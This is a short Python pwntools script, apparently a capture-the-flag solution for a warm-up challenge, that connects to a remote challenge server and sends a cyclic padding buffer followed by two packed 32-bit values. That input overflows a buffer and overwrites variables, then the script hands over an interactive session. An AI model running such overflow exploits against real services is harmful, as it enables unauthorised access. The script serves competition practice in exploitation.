from pwn import *

# p = process('./pwn-warmup')
p = remote("chal.uiuc.tf" ,2003)


# input("debug")

p.recvuntil("hmm...")

payload = bytes(cyclic(cyclic_find('eaaa')), 'utf-8')
payload += p32(0x12345678)
payload += p32(0x1)

p.sendline(payload)


p.interactive()

